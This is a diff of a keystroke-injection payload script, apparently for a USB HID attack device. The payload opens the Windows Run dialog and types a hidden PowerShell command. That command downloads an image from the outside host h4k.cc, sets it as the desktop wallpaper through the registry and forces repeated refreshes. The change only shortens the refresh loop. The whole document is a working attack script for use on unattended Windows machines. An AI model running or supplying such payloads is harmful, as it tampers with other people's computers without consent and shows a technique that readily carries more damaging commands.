@@ -10,5 +10,5 @@ ATTACKMODE HID
 LED ATTACK
 Q GUI r
 Q DELAY 500
-Q STRING "cmd /C \"start /MIN powershell iwr -Uri http://h4k.cc/b.jpg -OutFile c:\windows\temp\b.jpg;sp 'HKCU:Control Panel\Desktop' WallPaper 'c:\windows\temp\b.jpg';\$a=1;do{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}while(\$a++-le59)\""
+Q STRING "cmd /C \"start /MIN powershell iwr -Uri http://h4k.cc/b.jpg -OutFile c:\windows\temp\b.jpg;sp 'HKCU:Control Panel\Desktop' WallPaper 'c:\windows\temp\b.jpg';1..60|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}\""
 Q ENTER
